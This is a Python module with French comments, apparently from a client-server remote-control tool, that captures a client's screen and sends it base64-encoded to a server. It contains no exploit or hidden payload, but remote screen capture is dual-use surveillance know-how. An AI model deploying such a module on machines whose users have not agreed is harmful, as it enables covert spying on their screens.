# Commande permettant de capturer une image de l’écran du client.
# L’image est encodée en base64 avant d’être envoyée au serveur.

from .base_command import BaseCommand
from ..client.screenshot_service import ScreenshotService
import base64


class ScreenshotCommand(BaseCommand):

    name = "screenshot"
    description = "Capture the screen"

    # Service responsable de la capture d’écran
    _service = ScreenshotService()

    def execute(self, args: str) -> str:

        try:

            # Capture de l’écran (retour en bytes PNG)
            image_bytes = self._service.capture()

            # Encodage en base64 pour transmission via protocole texte
            encoded = base64.b64encode(image_bytes).decode()

            # Réponse formatée pour le serveur
            return "SCREENSHOT\n" "OK\n" f"{encoded}\n" "EOF"

        except Exception as e:

            # Gestion d’erreur si capture ou encodage échoue
            return "SCREENSHOT\n" "ERROR\n" f"{e}\n" "EOF"
